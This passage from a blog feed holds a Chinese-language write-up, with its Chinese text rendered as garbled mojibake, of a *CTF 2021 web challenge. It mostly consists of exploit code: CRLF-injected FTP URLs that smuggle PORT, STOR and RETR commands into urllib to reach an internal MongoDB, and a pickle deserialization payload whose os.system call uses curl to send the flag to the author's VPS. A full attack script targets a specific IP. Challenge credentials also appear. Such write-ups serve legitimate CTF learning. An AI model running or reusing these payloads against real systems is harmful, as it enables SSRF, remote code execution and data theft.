class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ftp_login</span>(<span class="params">self</span>):</span></span><br><span class="line">        ftp = FTP()</span><br><span class="line">        ftp.connect(<span class="string">&quot;172.20.0.2&quot;</span>, <span class="number">8877</span>)</span><br><span class="line">        ftp.login(<span class="string">&quot;fan&quot;</span>, <span class="string">&quot;root&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> ftp</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">callback</span>(<span class="params">self,*args, **kwargs</span>):</span></span><br><span class="line">        data = json.loads(args[<span class="number">0</span>].decode())</span><br><span class="line">        self.data = data</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_config</span>(<span class="params">self</span>):</span></span><br><span class="line">        f = self.ftp_login()</span><br><span class="line">        f.cwd(<span class="string">&quot;files&quot;</span>)</span><br><span class="line">        buf_size = <span class="number">1024</span></span><br><span class="line">        f.retrbinary(<span class="string">&#x27;RETR &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;config.json&#x27;</span>), self.callback, buf_size)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.get_config()</span><br><span class="line">        data = self.data</span><br><span class="line"></span><br><span class="line">        self.secret_key = data[<span class="string">&#x27;secret_key&#x27;</span>]</span><br><span class="line">        self.SECRET_KEY = data[<span class="string">&#x27;secret_key&#x27;</span>]</span><br><span class="line">        self.DEBUG = data[<span class="string">&#x27;DEBUG&#x27;</span>]</span><br><span class="line">        self.SESSION_TYPE = data[<span class="string">&#x27;SESSION_TYPE&#x27;</span>]</span><br><span class="line">        remote_mongo_ip = data[<span class="string">&#x27;REMOTE_MONGO_IP&#x27;</span>]</span><br><span class="line">        remote_mongo_port = data[<span class="string">&#x27;REMOTE_MONGO_PORT&#x27;</span>]</span><br><span class="line">        self.SESSION_MONGODB = pymongo.MongoClient(remote_mongo_ip, remote_mongo_port)</span><br><span class="line">        self.SESSION_MONGODB_DB = data[<span class="string">&#x27;SESSION_MONGODB_DB&#x27;</span>]</span><br><span class="line">        self.SESSION_MONGODB_COLLECT = data[<span class="string">&#x27;SESSION_MONGODB_COLLECT&#x27;</span>]</span><br><span class="line">        self.SESSION_PERMANENT = data[<span class="string">&#x27;SESSION_PERMANENT&#x27;</span>]</span><br><span class="line">        self.SESSION_USE_SIGNER = data[<span class="string">&#x27;SESSION_USE_SIGNER&#x27;</span>]</span><br><span class="line">        self.SESSION_KEY_PREFIX = data[<span class="string">&#x27;SESSION_KEY_PREFIX&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        self.SQLALCHEMY_DATABASE_URI = data[<span class="string">&#x27;SQLALCHEMY_DATABASE_URI&#x27;</span>]</span><br><span class="line">        self.SQLALCHEMY_TRACK_MODIFICATIONS = data[<span class="string">&#x27;SQLALCHEMY_TRACK_MODIFICATIONS&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        self.REDIS_URL = data[<span class="string">&#x27;REDIS_URL&#x27;</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¼€äº†ä¸ª ftpï¼Œè¯»å–  config.jsonï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp:&#x2F;&#x2F;fan:root@172.20.0.2:8877&#x2F;files&#x2F;config.json</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;secret_key&quot;</span>:<span class="string">&quot;f4545478ee86$%^&amp;&amp;%$#&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;DEBUG&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">&quot;SESSION_TYPE&quot;</span>: <span class="string">&quot;mongodb&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;REMOTE_MONGO_IP&quot;</span>: <span class="string">&quot;172.20.0.5&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;REMOTE_MONGO_PORT&quot;</span>: <span class="number">27017</span>,</span><br><span class="line">  <span class="attr">&quot;SESSION_MONGODB_DB&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;SESSION_MONGODB_COLLECT&quot;</span>: <span class="string">&quot;sessions&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;SESSION_PERMANENT&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">&quot;SESSION_USE_SIGNER&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">&quot;SESSION_KEY_PREFIX&quot;</span>: <span class="string">&quot;session:&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;SQLALCHEMY_DATABASE_URI&quot;</span>: <span class="string">&quot;mysql+pymysql://root:starctf123456@172.20.0.3:3306/ctf?charset=utf8&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;SQLALCHEMY_TRACK_MODIFICATIONS&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">&quot;REDIS_URL&quot;</span>: <span class="string">&quot;redis://@172.20.0.4:6379/0&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ª urllib.request.urlopenï¼Œæµ‹è¯•å‘ç°å­˜åœ¨ CRLF æ³¨å…¥ã€‚</p><p>åˆ†æä¸€ä¸‹ï¼Œé¢˜ç›®è¿åŒ webserverï¼Œä¸€å…±å¯åŠ¨äº† webserverã€ftpã€mongodbã€mysql ä¸ redis 5 ä¸ªå®¹å™¨ã€‚é¢˜ç›®æç¤ºéœ€è¦ webserver çš„ rceï¼Œä»¥åŠä¸ redis æ— å…³ã€‚</p><p>åœ¨ config.json ä¸­å¯ä»¥çœ‹åˆ° session æ˜¯ä½¿ç”¨ mongodb å­˜å‚¨çš„ï¼Œä»¥å‰æ€»æ˜¯è€ƒä½¿ç”¨ redis å­˜å‚¨ï¼Œssrf æ”»å‡» redis æ³¨å…¥æ¶æ„åºåˆ—åŒ–æ•°æ® getshellã€‚è¿™ä¸ªé¢˜è™½ç„¶æ˜¯ä½¿ç”¨ mongodb å­˜å‚¨ sessionï¼Œä½†å› ä¸º flask-session æŠŠ session æ•°æ®åºåˆ—åŒ–ï¼Œæ‰€ä»¥æ— è®ºä½¿ç”¨ä»€ä¹ˆå­˜å‚¨ sessionï¼Œç†è®ºä¸Šéƒ½æœ‰ ssrf + ååºåˆ—åŒ–çš„å¯èƒ½ã€‚</p><p>ç°åœ¨æˆ‘ä»¬çš„ç›®æ ‡æ˜¯å°†æ¶æ„çš„åºåˆ—åŒ–æ•°æ®æ³¨å…¥åˆ°mongodbé‡Œï¼Œè¿™å°±éœ€è¦å€ŸåŠ© ftp äº†ã€‚ä¸ºä»€ä¹ˆä¸èƒ½ä½¿ç”¨<code>http://ip:port\r\npayload\r\n</code>è¿™ç§å‘¢ï¼Œå› ä¸º mongodb æ˜¯äºŒè¿›åˆ¶åè®®ï¼Œè¿™æ ·åšå‰é¢ä¼šæœ‰å¤šä½™çš„éƒ¨åˆ†ï¼ˆhttp åŒ…ï¼Œå‰é¢çš„GETä¸è·¯å¾„éƒ¨åˆ†ç­‰ï¼‰ï¼Œä¼šå½±å“ mongodbã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦å€ŸåŠ© ftpï¼Œftp ä¸»åŠ¨æ¨¡å¼ä¸è¢«åŠ¨æ¨¡å¼ï¼Œä»¥åŠ CRLF å¯ä»¥å‚è€ƒ@Zeddy çš„æ–‡ç« ï¼š<a href="http://blog.zeddyu.info/2020/04/20/Plaid-CTF-2020-Web-1/">http://blog.zeddyu.info/2020/04/20/Plaid-CTF-2020-Web-1/</a></p><p>æ¯”èµ›çš„æ—¶å€™ï¼Œä¸€ç›´å‘ç€è¢«åŠ¨æ¨¡å¼ï¼Œå°è¯•è®© webserver ä¸‹è½½æ–‡ä»¶ï¼Œæ€è·¯èµ°åäº†ã€‚è¿™ä¸ªé¢˜å…¶å®æ˜¯åˆ©ç”¨ä¸»åŠ¨æ¨¡å¼ä¸‹è½½æ–‡ä»¶ä¸ä¸Šä¼ æ–‡ä»¶ã€‚</p><p>å…ˆæ”¾ä¸€å¼ ä¸»åŠ¨æ¨¡å¼çš„ç¤ºæ„å›¾ï¼š</p><p><img src="/2021/01/19/2021-starctf/v2-0db8a30b0848c731fdb70f3270f5fba3_1440w.jpg" alt="img"></p><p>æ—¢ç„¶æˆ‘ä»¬åˆ©ç”¨ http æ— æ³•æ”»å‡» mongodbï¼Œé‚£ä¹ˆå°±éœ€è¦ ftp æœåŠ¡å™¨å¸®æˆ‘ä»¬æŠŠæ•°æ®æ‰“è¿‡å»ã€‚å¯ä»¥æƒ³åˆ°æˆ‘ä»¬å¯ä»¥åœ¨ä¸»åŠ¨æ¨¡å¼çš„æ­¥éª¤ 2ï¼Œç”¨ PORT å‘½ä»¤æŠŠå®¢æˆ·ç«¯æŒ‡å®šæˆ mongodb æœåŠ¡çš„ ip å’Œç«¯å£ï¼Œå†é€‰æ‹©ä¸‹è½½æ–‡ä»¶ï¼Œè¿™æ ·å°±å¯ä»¥æŠŠæ–‡ä»¶çš„å†…å®¹æ‰“åˆ° mongodb æœåŠ¡ã€‚</p><p>é‚£ä¹ˆè¿™ä¸ªæ”»å‡»å‰ææ˜¯æˆ‘ä»¬éœ€è¦å°†æ•°æ®åŒ…å†™åˆ° ftp server çš„ä¸€ä¸ªæ–‡ä»¶é‡Œï¼Œè¿™ä¹Ÿå¯ä»¥åˆ©ç”¨ä¸»åŠ¨æ¨¡å¼å®ç°ã€‚æˆ‘ä»¬åŒæ ·åœ¨æ­¥éª¤ 2ï¼Œç”¨ PORT å‘½ä»¤æŠŠå®¢æˆ·ç«¯æŒ‡å®šæˆæˆ‘ä»¬ vps çš„ ip å’Œç«¯å£ï¼Œå†é€‰æ‹©ä¸Šä¼ æ–‡ä»¶ï¼Œé‚£ä¹ˆ ftp server å°±å¯ä»¥ä»æˆ‘ä»¬çš„vpsè¿™é‡Œä¸‹è½½æ–‡ä»¶ã€‚</p><p>æ‰€ä»¥æ€è·¯æ˜ç¡®äº†ï¼Œæ­¥éª¤å¦‚ä¸‹ï¼š</p><ol><li>å°†æ•°æ®åŒ…æ”¾åˆ°vpsä¸Šï¼Œåˆ©ç”¨ ftp å°†æ•°æ®åŒ…ä¸Šä¼ åˆ° ftp serverï¼›</li><li>åˆ©ç”¨ ftp æŠŠ ftp server çš„æ•°æ®åŒ…å‘é€åˆ° mongodb ï¼ˆæŠŠæµé‡æ‰“è¿‡å»ï¼‰</li><li>åˆ·æ–°ç›¸åº” session é¡µé¢ï¼Œè§¦å‘ååºåˆ—åŒ–</li></ol><p>ç°åœ¨å‰©ä¸‹çš„ä¸€ä¸ªé—®é¢˜å°±æ˜¯ mongodb çš„æ•°æ®åŒ…æˆ‘ä»¬æ²¡æœ‰ï¼Œè¿™é‡Œé‡‡å–æœ¬åœ°æŠ“åŒ…çš„æ–¹å¼ã€‚ä¹Ÿå¯ä»¥å‚è€ƒ L æˆ˜é˜Ÿå¸ˆå‚…çš„æ–¹æ³•ï¼š<a href="https://blog.frankli.site/2021/01/18/*CTF-2021-Web/">https://blog.frankli.site/2021/01/18/*CTF-2021-Web/</a></p><p>é¦–å…ˆå¯ä¸€ä¸ª mongodb çš„dockerï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd --name mongo -p 27017:27017 mongo</span><br></pre></td></tr></table></figure><p>æŒ‰ç…§é¢˜ç›®ï¼Œè¿›å…¥å®¹å™¨ï¼Œåˆ›å»ºåä¸º admin çš„æ•°æ®åº“ä¸åä¸º sessions çš„ collectionã€‚</p><p>è¿™é‡Œä¸ºäº†æŠ“æµé‡ï¼Œä½¿ç”¨ socat è½¬å‘æµé‡ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat -v -x tcp-listen:4444,fork tcp-connect:localhost:27017</span><br></pre></td></tr></table></figure><p>æ‹¿ python æ’å…¥æ•°æ®ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> cPickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> pymongo <span class="keyword">import</span> MongoClient</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_payload</span>():</span></span><br><span class="line">    cmd = <span class="string">&#x27;curl -d &quot;`/readflag`&quot; vps:2333&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">exp</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">            <span class="keyword">return</span> (os.system, (cmd,))</span><br><span class="line"></span><br><span class="line">    data = cPickle.dumps(exp())</span><br><span class="line"></span><br><span class="line">    client = MongoClient(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">4444</span>)</span><br><span class="line">    tmp = client.admin.sessions</span><br><span class="line">    tmp.update_one(</span><br><span class="line">        &#123;<span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;session:1b3c3cb9-d81c-419d-8e2d-3a8130ebde62&#x27;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;$set&quot;</span>: &#123;<span class="string">&quot;val&quot;</span>: data&#125;&#125;,</span><br><span class="line">        upsert=<span class="literal">True</span></span><br><span class="line">    )</span><br><span class="line">get_payload()</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ° socat è®°å½•ä¸‹äº†æµé‡ï¼š</p><img src="/2021/01/19/2021-starctf/image-20210119144403189.png" alt="image-20210119144403189" style="zoom:50%;"><p>è¿™éƒ¨åˆ†æ˜¯æ’å…¥æ•°æ®çš„æµé‡ï¼Œæˆ‘ä»¬éœ€è¦åå…­è¿›åˆ¶ä¿å­˜ä¸‹æ¥ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat -x tcp-listen:4444,fork tcp-connect:localhost:27017</span><br></pre></td></tr></table></figure><p>æŠŠæ•°æ®åŒ…ä¿å­˜ï¼Œæ”¾åˆ° vpsä¸Šï¼Œèµ·ä¸ªç›‘å¬çš„æœåŠ¡ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> ctime</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line">PORT = <span class="number">2202</span></span><br><span class="line">BUFSIZ = <span class="number">1024</span></span><br><span class="line">ADDR = (HOST, PORT)</span><br><span class="line"></span><br><span class="line">tcpSerSock = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">tcpSerSock.bind(ADDR)</span><br><span class="line">tcpSerSock.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    print(<span class="string">&#x27;waiting for connection...&#x27;</span>)</span><br><span class="line">    tcpCliSock, addr = tcpSerSock.accept()</span><br><span class="line">    cnt += <span class="number">1</span></span><br><span class="line">    print(<span class="string">&#x27;...connnecting from:&#x27;</span>, addr)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>):</span><br><span class="line">        content = <span class="built_in">open</span>(<span class="string">&#x27;gml.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">        print(content)</span><br><span class="line">        tcpCliSock.send(content)</span><br><span class="line">tcpSerSock.close()</span><br></pre></td></tr></table></figure><p>ç°åœ¨è®© ftp server ä¸‹è½½æˆ‘ä»¬çš„æ–‡ä»¶ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp:&#x2F;&#x2F;fan:root\r\nCWD .\r\nTYPE I\r\nPORT x,x,x,x,6,666\r\nSTOR gml.txt\r\n@172.20.0.2:8877&#x2F;&quot;</span><br></pre></td></tr></table></figure><p>æ³¨æ„ PORT å‘½ä»¤æ ¼å¼ï¼Œå‰å››ä¸ªæ•°å­—æ˜¯åè¿›åˆ¶çš„ipï¼Œåä¸¤ä¸ªæ˜¯ <code>6*256+666=2202</code>ï¼Œè¿™ä¹ˆè®¡ç®—çš„ç«¯å£å·ã€‚</p><p>å†æ¬¡è®¿é—® ftpï¼Œå‘ç°æœ‰äº†æ–‡ä»¶ï¼š</p><p><img src="/2021/01/19/2021-starctf/image-20210119142025328.png" alt="image-20210119142025328"></p><p>ä¸‹é¢è®© ftp server å»å‘ mongoldb å‘æµé‡ï¼ˆç«¯å£å·<code>105*256+137=27017</code>ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp:&#x2F;&#x2F;fan:root\r\nCWD .\r\nTYPE I\r\nPORT 172,20,0,5,105,137\r\nRETR gml.txt\r\n@172.20.0.2:8877&#x2F;</span><br></pre></td></tr></table></figure><p>ç„¶ååˆ·æ–°ä¸€ä¸‹é¡µé¢ï¼š</p><img src="/2021/01/19/2021-starctf/image-20210119142245882.png" alt="image-20210119142245882" style="zoom:50%;"><p>å®Œæ•´çš„è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> cPickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> pymongo <span class="keyword">import</span> MongoClient</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_payload</span>():</span></span><br><span class="line">    cmd = <span class="string">&#x27;curl -d &quot;`/readflag`&quot; x,x,x,x:2333&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">exp</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">            <span class="keyword">return</span> (os.system, (cmd,))</span><br><span class="line"></span><br><span class="line">    data = cPickle.dumps(exp())</span><br><span class="line"></span><br><span class="line">    client = MongoClient(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">4444</span>)</span><br><span class="line">    tmp = client.admin.sessions</span><br><span class="line">    tmp.update_one(</span><br><span class="line">        &#123;<span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;session:1b3c3cb9-d81c-419d-8e2d-3a8130ebde62&#x27;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;$set&quot;</span>: &#123;<span class="string">&quot;val&quot;</span>: data&#125;&#125;,</span><br><span class="line">        upsert=<span class="literal">True</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack</span>(<span class="params">filename</span>):</span></span><br><span class="line">    url = <span class="string">&quot;http://52.163.52.206:8088/&quot;</span></span><br><span class="line">    session = requests.Session()</span><br><span class="line">    username = <span class="string">&quot;&quot;</span>.join([random.choice(string.ascii_letters + string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)])</span><br><span class="line">    password = <span class="string">&quot;&quot;</span>.join([random.choice(string.ascii_letters + string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)])</span><br><span class="line"></span><br><span class="line">    paramsPost = &#123;<span class="string">&quot;password&quot;</span>: password, <span class="string">&quot;avatar&quot;</span>: filename, <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;Go!&quot;</span>, <span class="string">&quot;username&quot;</span>: username&#125;</span><br><span class="line">    headers = &#123;<span class="string">&quot;Origin&quot;</span>: url, <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">               <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Referer&quot;</span>: url + <span class="string">&quot;login&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;</span><br><span class="line">    response = session.post(url + <span class="string">&quot;login&quot;</span>, data=paramsPost, headers=headers, proxies=&#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    content = session.get(url + <span class="string">&#x27;shake_and_dice&#x27;</span>).content</span><br><span class="line"></span><br><span class="line">    res = content[content.find(<span class="string">&#x27;&lt;img src=&quot;&#x27;</span>) + <span class="built_in">len</span>(<span class="string">&#x27;&lt;img src=&quot;&#x27;</span>):content.find(<span class="string">&#x27;&quot; class=&quot;img-thumbnail&quot;&#x27;</span>)]</span><br><span class="line">    res = res[res.find(<span class="string">&#x27;data:image/png;base64,&#x27;</span>) + <span class="built_in">len</span>(<span class="string">&#x27;data:image/png;base64,&#x27;</span>):]</span><br><span class="line">    <span class="comment"># print res</span></span><br><span class="line">    file = b64decode(res)</span><br><span class="line">    name = filename.split(<span class="string">&#x27;/&#x27;</span>)[<span class="number">-1</span>]</span><br><span class="line">    <span class="built_in">print</span> file</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># get_payload()</span></span><br><span class="line">    <span class="comment"># attack(&quot;ftp://fan:root@172.20.0.2:8877/&quot;)</span></span><br><span class="line">    <span class="comment"># attack(&quot;ftp://fan:root\r\nCWD .\r\nTYPE I\r\nPORT x,x,x,x,6,666\r\nSTOR gml.txt\r\n@172.20.0.2:8877/&quot;)</span></span><br><span class="line">    attack(<span class="string">&quot;ftp://fan:root\r\nCWD .\r\nTYPE I\r\nPORT 172,20,0,5,105,137\r\n\r\nRETR gml.txt\r\n@172.20.0.2:8877/&quot;</span>)</span><br></pre></td></tr></table></figure><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>è¿™æ¬¡é™¤äº† bet æ„Ÿè§‰å‰©ä¸‹ä¸æ˜¯é‚£ä¹ˆä¼ ç»Ÿçš„ Webï¼Œè‡ªå·±å› ä¸ºä¹‹å‰ ftp æ²¡è°ƒè¿‡ä¹Ÿæ²¡å¤ç°è¿‡ï¼ˆä¹‹å‰åº”è¯¥æœ‰å‡ æ¬¡æ¯”èµ›è€ƒå¯Ÿäº† ftp ï¼Œåƒäº†æ‡’æƒ°çš„äºâ€¦</p><p>æœ€åç¦» 0ops å°±å·®ä¸€é“é¢˜æœ‰ç‚¹å¯æƒœï¼Œä¸è¿‡ 0ops ä¹‹å‰æœ‰é—¨ç¥¨ï¼Œåº”è¯¥ä¹Ÿè¿›äº† XCTF Finalã€‚anywayï¼Œè¿™æ¬¡ç®—æ˜¯æˆ˜é˜Ÿå…¨åŠ›æ‰“äº†ï¼Œé˜Ÿå‹éƒ½ tqlã€‚</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;å› ä¸ºæˆ˜é˜Ÿä¹‹å‰ XCTF æ²¡æ€ä¹ˆå…¨å‘˜æ‰“ï¼Œæ²¡æœ‰é—¨ç¥¨ï¼Œ*CTFæ˜¯æœ€åä¸€æ¬¡å…¥åœºåˆ¸äº†ï¼Œæ‰€ä»¥å‘¨æœ«è·Ÿé˜Ÿå‹å…¨åŠ›æ‰“äº†ä¸‹ *CTFã€‚æœ‰ç‚¹å¯æƒœï¼Œå·®äº†é“ Webï¼ˆèƒŒé”…â€¦&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/01/19/2021-starctf/image-20210118183846729.png&quot; alt=&quot;image-20210118183846729&quot;&gt;&lt;/p&gt;
&lt;p&gt;å››é“ Webï¼Œæ„Ÿè§‰é™¤äº† betï¼Œå‰©ä¸‹çš„éƒ½ä¸é‚£ä¹ˆ Webâ€¦&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://igml.top/categories/CTF/"/>
    
    <category term="Web" scheme="https://igml.top/categories/CTF/Web/"/>
    
    
    <category term="CTF" scheme="https://igml.top/tags/CTF/"/>
    
    <category term="Web" scheme="https://igml.top/tags/Web/"/>
    
    <category term="wp" scheme="https://igml.top/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>2020 XCTF åä¸ºäº‘ä¸“åœºéƒ¨åˆ†wp</title>
    <link href="https://igml.top/2020/12/21/2020-XCTF-huawei-cloud/"/>
    <id>https://igml.top/2020/12/21/2020-XCTF-huawei-cloud/</id>
    <published>2020-12-21T10:45:02.000Z</published>
    <updated>2020-12-21T11:19:15.422Z</updated>
    
